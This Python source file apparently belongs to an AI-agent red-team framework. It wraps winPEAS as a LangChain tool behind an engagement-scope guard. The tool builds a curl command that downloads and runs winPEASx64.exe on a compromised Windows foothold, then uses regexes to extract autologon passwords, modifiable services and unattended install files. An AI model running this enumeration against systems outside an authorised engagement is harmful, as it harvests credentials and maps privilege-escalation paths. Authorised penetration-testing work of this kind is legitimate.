"""AutoRed winpeas tool wrapper — Phase 4, Task 3.

``winpeas`` is the Windows counterpart of linpeas — a C# / batch
enumeration script from PEASS-ng that prints a long report covering
autologon registry creds, modifiable services, unattended install files,
registry autoruns, etc.

Same Phase 4 stub pattern as ``linpeas_run``: the wrapper constructs the
winpeas command string, persists it via ``_save_raw``, and returns an
empty ``WinpeasResult``. Real execution is deferred to the Phase 6
FootholdSessionManager. The ``_parse_winpeas_output`` helper is exported
so a Phase 6 caller can pass real winpeas stdout back through the same
parser that the unit tests exercise on the fixture file.

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER.

Spec ref: §3.4 (post-ex models), §6.8 (RoE guard), §9.2 (RoE categories).
"""
from __future__ import annotations

import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.foothold_session import get_installed
from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw  # reuse from nmap

log = get_logger("tools.winpeas")


class WinpeasResult(BaseModel):
    """Parsed findings from a winpeas run.

    Phase 4 callers receive this with all list fields empty — real execution
    is deferred to Phase 6. Phase 6 callers receive this populated via
    ``_parse_winpeas_output(real_stdout, host_ip)`` when the
    ``FootholdSessionManager`` is installed (otherwise the wrapper falls
    through to evidence-string mode).
    """

    host_ip: str
    autologon_credentials: list[dict[str, str]] = Field(default_factory=list)
    modifiable_services: list[str] = Field(default_factory=list)
    unattended_files: list[str] = Field(default_factory=list)
    raw_output_path: str = ""
    command: str = ""
    duration_sec: float = 0.0


# Autologon registry field regex — winpeas prints these as PowerShell-style
# ``DefaultXxxName    :  Value`` lines with arbitrary whitespace around the
# colon. ``\S+`` captures everything up to the next whitespace.
_AUTOLOGON_USER = re.compile(r"DefaultUserName\s*:\s*(\S+)")
_AUTOLOGON_PASS = re.compile(r"DefaultPassword\s*:\s*(\S+)")
_AUTOLOGON_DOMAIN = re.compile(r"DefaultDomainName\s*:\s*(\S+)")


def _parse_winpeas_output(text: str, host_ip: str) -> WinpeasResult:
    """Parse winpeas stdout into a ``WinpeasResult``.

    Winpeas output is structured into ``╚═══...═╣ Section Name`` sections,
    same as linpeas. The three sections the Phase 4 brief cares about —
    Modifiable Services, Autologon Registry, Unattended Files — are
    extracted by anchored regex + non-greedy DOTALL capture that stops at
    the next ``╚`` section header. The autologon extraction is regex-only
    (no section anchoring) because winpeas prints the same triple of
    ``DefaultDomainName / DefaultUserName / DefaultPassword`` lines in
    both the "Checking for Autologon Registry" section AND the trailing
    credentials summary.

    Empty input must not crash — returns a result with all list fields empty.
    """
    result = WinpeasResult(host_ip=host_ip)

    # Autologon creds — regex-only, single-occurrence. If a username or
    # password line is missing, the field is left blank in the cred dict
    # so callers can still see what *was* recovered.
    user_match = _AUTOLOGON_USER.search(text)
    pass_match = _AUTOLOGON_PASS.search(text)
    domain_match = _AUTOLOGON_DOMAIN.search(text)
    if user_match or pass_match:
        result.autologon_credentials.append(
            {
                "username": user_match.group(1) if user_match else "",
                "password": pass_match.group(1) if pass_match else "",
                "domain": domain_match.group(1) if domain_match else "",
            }
        )

    # Modifiable Services section.
    ms_section = re.search(
        r"Modifiable Services\n(.+?)(?=\n╚|$)", text, re.DOTALL
    )
    if ms_section:
        result.modifiable_services = [
            line.strip()
            for line in ms_section.group(1).splitlines()
            if line.strip() and not line.startswith("╚")
        ]

    # Unattended Files section — winpeas prints absolute Windows paths.
    uf_section = re.search(
        r"Unattended Files\n(.+?)(?=\n╚|$)", text, re.DOTALL
    )
    if uf_section:
        result.unattended_files = [
            line.strip()
            for line in uf_section.group(1).splitlines()
            if line.strip() and not line.startswith("╚")
        ]

    return result


@tool
@roe_guard(allowed_categories=["read_only"])
async def winpeas_run(
    foothold_id: str,
    host_ip: str,
    engagement_id: str = "",
) -> WinpeasResult:
    """Run winpeas on a Windows foothold.

    The command is constructed for execution via the foothold's shell session.
    Actual execution requires the session manager (Phase 6). For now, this tool
    builds the command and saves it to ``engagements/<id>/raw/`` so the Phase 6
    FootholdSessionManager can replay it; the returned ``WinpeasResult`` has
    all parse lists empty because no real winpeas stdout was produced.

    Args:
        foothold_id: ID of the foothold to enumerate.
        host_ip: IP of the foothold host (used by the RoE guard scope check
            and recorded in ``WinpeasResult.host_ip``).
        engagement_id: Current engagement ID for raw output storage + RoE
            registry lookup.

    Returns:
        ``WinpeasResult`` with ``raw_output_path`` set (command was saved)
        and parse lists empty (Phase 4 stub). Phase 6 callers will receive
        a populated result via the foothold shell session.
    """
    log.info("winpeas_start", host_ip=host_ip, foothold_id=foothold_id)

    # winpeas.exe download + execute — canonical PEASS-ng install pattern.
    # Downloaded from the GitHub releases, marked executable, and run with
    # the foothold's current privileges so it can inspect the local host.
    cmd_str = (
        "curl -sL "
        "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe "
        "-o winPEASx64.exe && ./winPEASx64.exe"
    )

    # Phase 6: execute via the foothold session manager when installed.
    session = get_installed()
    if session is not None:
        foothold = session.find_foothold(foothold_id)
        exec_result = None
        if foothold is not None:
            exec_result = await session.execute(foothold, cmd_str)
        if exec_result is not None and exec_result.success:
            raw_path = await _save_raw(
                "winpeas", host_ip, exec_result.stdout, exec_result.stderr,
                engagement_id,
            )
            parsed = _parse_winpeas_output(exec_result.stdout, host_ip)
            parsed.raw_output_path = raw_path
            parsed.command = cmd_str
            parsed.duration_sec = exec_result.duration_sec
            log.info(
                "winpeas_executed",
                host_ip=host_ip, duration=exec_result.duration_sec,
            )
            return parsed
        log.warning(
            "winpeas_execution_unavailable",
            host_ip=host_ip,
            stderr=(exec_result.stderr if exec_result else "foothold not found"),
        )

    # Fallback: evidence-string mode (Phase 4 behavior).
    raw_path = await _save_raw("winpeas_cmd", host_ip, cmd_str, "", engagement_id)
    log.info(
        "winpeas_done",
        host_ip=host_ip,
        foothold_id=foothold_id,
        note="command saved, execution unavailable",
    )
    return WinpeasResult(
        host_ip=host_ip, raw_output_path=raw_path, command=cmd_str,
    )
